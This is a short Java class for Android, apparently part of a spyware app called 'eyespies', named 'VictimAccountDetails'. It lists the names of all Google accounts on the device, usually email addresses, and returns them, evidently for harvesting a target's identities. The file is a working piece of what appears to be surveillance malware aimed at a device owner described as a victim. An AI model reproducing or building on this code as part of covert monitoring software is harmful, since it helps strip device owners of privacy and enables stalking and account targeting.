package com.eyespies.service;

import java.util.ArrayList;
import java.util.List;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;

public class VictimAccountDetails {
	static List<String> getAccount(Context context){
		AccountManager manager = AccountManager.get(context);
		Account[] accounts = manager.getAccountsByType("com.google");
		//Account account = accounts[0];
		List<String> accList = new ArrayList<String>();
		for(Account acc : accounts){
			accList.add(acc.name);
		}
		return accList;
	}
}
